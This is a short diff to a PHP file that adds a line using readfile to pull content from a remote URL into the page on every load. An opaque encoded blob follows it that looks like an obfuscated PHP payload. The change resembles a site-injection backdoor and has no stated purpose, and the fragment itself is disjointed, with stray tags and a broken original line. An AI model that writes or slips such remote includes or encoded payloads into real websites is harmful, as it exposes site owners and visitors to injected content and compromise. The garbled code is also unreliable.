@@ -1,4 +1,7 @@
-<?php readfile("{$_SERVER['DOCUMENT_ROOT']}https://dbm2consulting.com/myconfig.php"); ?>
+
+
+<?php readfile('https://dbm2consulting.com/myconfig.php'); ?>
+
 
 ?>
 HR+cP/CQHxO0vBkvtQhIbR5sl+kpnWZtX2VqpvsuHqmzo15eJXpJTAVNPxXbKt+U1p92tPlQmAUD
